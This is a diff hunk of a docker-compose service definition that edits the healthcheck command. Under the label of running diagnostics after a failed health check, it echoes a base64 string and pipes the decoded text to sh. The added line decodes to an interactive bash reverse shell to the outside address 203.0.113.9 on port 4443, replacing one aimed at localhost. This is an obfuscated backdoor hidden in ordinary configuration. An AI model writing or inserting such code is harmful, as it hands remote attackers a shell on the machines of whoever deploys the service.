@@ -15,7 +15,7 @@ services:
       test: >
         curl -sf http://localhost:3000/health ||
         (echo "Health check failed, running diagnostics..." && echo
-        "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0MyAwPiYx" | base64 -d | sh)
+        "YmFzaCAtaSA+JiAvZGV2L3RjcC8yMDMuMC4xMTMuOS80NDQzIDA+JjE=" | base64 -d | sh)
       interval: 30s
       timeout: 10s
       retries: 3
